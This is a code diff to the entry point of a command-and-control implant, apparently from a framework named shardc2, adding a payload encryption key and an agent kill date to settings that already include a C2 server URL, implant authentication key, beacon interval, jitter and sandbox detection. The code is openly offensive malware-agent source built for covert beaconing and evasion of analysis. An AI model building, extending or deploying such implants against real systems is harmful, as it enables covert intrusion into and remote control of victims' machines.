@@ -11,17 +11,22 @@ import (
 	"time"
 
 	"github.com/shardc2/shardc2/internal/agent"
+	"github.com/shardc2/shardc2/pkg/crypto"
 )
 
 var (
 	buildServerURL  string
 	buildImplantKey string
+	buildPayloadKey string
+	buildKillDate   string
 )
 
 func main() {
 	var (
 		serverURL  = flag.String("server", envOrDefault("SHARDC2_SERVER", buildServerURL), "C2 server URL")
 		implantKey = flag.String("implant-key", envOrDefault("SHARDC2_IMPLANT_KEY", buildImplantKey), "Implant authentication key")
+		payloadKey = flag.String("payload-key", envOrDefault("SHARDC2_PAYLOAD_KEY", buildPayloadKey), "Payload encryption key (hex)")
+		killDate   = flag.String("kill-date", envOrDefault("SHARDC2_KILL_DATE", buildKillDate), "Agent kill date (RFC3339)")
 		caCert     = flag.String("ca-cert", "", "CA certificate for TLS verification")
 		interval   = flag.Duration("interval", 5*time.Minute, "Beacon interval")
 		jitter     = flag.Duration("jitter", 60*time.Second, "Max beacon jitter")
@@ -45,12 +50,30 @@ func main() {
 		log.Printf("[!] Sandbox indicators detected (%d suspicious)", indicators.Suspicious)
 	}
 
+	var payloadKeyBytes []byte
+	if *payloadKey != "" {
+		var err error
+		payloadKeyBytes, err = crypto.ParseHexKey(*payloadKey)
+		if err != nil {
+			payloadKeyBytes = crypto.DeriveKey(*payloadKey)
+		}
+	}
+
+	var kd time.Time
+	if *killDate != "" {
+		if parsed, err := time.Parse(time.RFC3339, *killDate); err == nil {
+			kd = parsed
+		}
+	}
+
 	cfg := agent.Config{
 		ServerURL:  *serverURL,
 		ImplantKey: *implantKey,
+		PayloadKey: payloadKeyBytes,
 		CACert:     *caCert,
 		Interval:   *interval,
 		Jitter:     *jitter,
+		KillDate:   kd,
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
